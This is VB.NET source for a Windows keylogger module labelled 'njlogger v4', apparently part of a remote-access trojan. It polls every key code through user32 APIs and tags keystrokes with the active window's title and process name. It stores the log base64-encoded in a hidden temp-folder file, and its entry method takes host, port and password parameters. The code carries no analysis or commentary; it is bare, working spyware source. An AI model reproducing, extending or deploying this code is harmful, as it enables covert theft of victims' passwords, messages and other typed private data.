
Public Class Main
    ' njlogger v4
#Region "API"
    <Runtime.InteropServices.DllImport("user32.dll")>
    Public Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Runtime.InteropServices.Out(), Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger,
      ByVal dwhkl As IntPtr) As Integer
    End Function
    <Runtime.InteropServices.DllImport("user32.dll")>
    Public Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <Runtime.InteropServices.DllImport("user32.dll")>
    Public Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Public Declare Function GetForegroundWindow Lib "user32" () As IntPtr
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
#End Region

    Public Shared LAW As Integer ' Last Active Window Handle
    Public Shared LAT As String ' Last Active Window Title
    Public Shared LK As Windows.Forms.Keys = Nothing ' Last Pressed Key

    Public Shared Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Object = Diagnostics.Process.GetProcessById(id)
            If o.ToInt32 = LAW And LAT = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
            Else

                LAW = o.ToInt32
                LAT = p.MainWindowTitle
                Return vbNewLine & ChrW(1) & HM() & " " & p.ProcessName & " " & LAT & ChrW(1) & vbNewLine
            End If
        Catch ex As Exception
        End Try
        Return ""
    End Function
    Public Shared _Time As New Microsoft.VisualBasic.Devices.Clock
    Public Shared Function HM() As String
        Try
            Return _Time.LocalTime.ToString("yy/MM/dd")
        Catch ex As Exception
            Return "??/??/??"
        End Try
    End Function
    Public Shared Logs As String = ""
    Public Shared KYB As Object = New Microsoft.VisualBasic.Devices.Keyboard
    Public Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0),
                 HKL)
            Return sbString.ToString()
        Catch ex As Exception
        End Try
        Return CType(VKCode, Windows.Forms.Keys).ToString
    End Function
    Public Shared Function Fix(ByVal k As Windows.Forms.Keys) As String
        Dim isuper As Boolean = KYB.ShiftKeyDown
        If KYB.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Windows.Forms.Keys.F1, Windows.Forms.Keys.F2, Windows.Forms.Keys.F3, Windows.Forms.Keys.F4, Windows.Forms.Keys.F5, Windows.Forms.Keys.F6, Windows.Forms.Keys.F7, Windows.Forms.Keys.F8, Windows.Forms.Keys.F9, Windows.Forms.Keys.F10, Windows.Forms.Keys.F11, Windows.Forms.Keys.F12, Windows.Forms.Keys.End, Windows.Forms.Keys.Delete, Windows.Forms.Keys.Back
                    Return "[" & k.ToString & "]"
                Case Windows.Forms.Keys.LShiftKey, Windows.Forms.Keys.RShiftKey, Windows.Forms.Keys.Shift, Windows.Forms.Keys.ShiftKey, Windows.Forms.Keys.Control, Windows.Forms.Keys.ControlKey, Windows.Forms.Keys.RControlKey, Windows.Forms.Keys.LControlKey, Windows.Forms.Keys.Alt
                    Return ""
                Case Windows.Forms.Keys.Space
                    Return " "
                Case Windows.Forms.Keys.Enter, Windows.Forms.Keys.Return
                    If Logs.EndsWith("[ENTER]" & vbNewLine) Then
                        Return ""
                    End If
                    Return "[ENTER]" & vbNewLine
                Case Windows.Forms.Keys.Tab
                    Return "[TAP]" & vbNewLine
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function


    Public Shared _KLG As String = IO.Path.GetTempPath + "\" + IO.Path.GetFileNameWithoutExtension(Windows.Forms.Application.ExecutablePath) + ".tmp"
    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

        Try
            Logs = (IO.File.ReadAllText(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(_KLG))))

        Catch ex As Exception
        End Try

        Try
            Dim lp As Integer = 0
            While True
                lp += 1
                For i As Integer = 0 To 255
                    If GetAsyncKeyState(i) = -32767 Then
                        Dim kk As Windows.Forms.Keys = i
                        Dim s = Fix(kk)
                        If s.Length > 0 Then
                            Logs &= AV()
                            Logs &= s
                        End If
                        LK = kk
                    End If
                Next
                If lp = 1000 Then
                    lp = 0
                    Dim mx As Integer = 250 * 1024 'refresh after 250kb
                    If Logs.Length > mx Then
                        Logs = Logs.Remove(0, Logs.Length - mx)
                    End If
                    IO.File.WriteAllText(_KLG, Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Logs)))
                End If
                Threading.Thread.CurrentThread.Sleep(1)

            End While
        Catch ex As Exception

        End Try
    End Sub
End Class



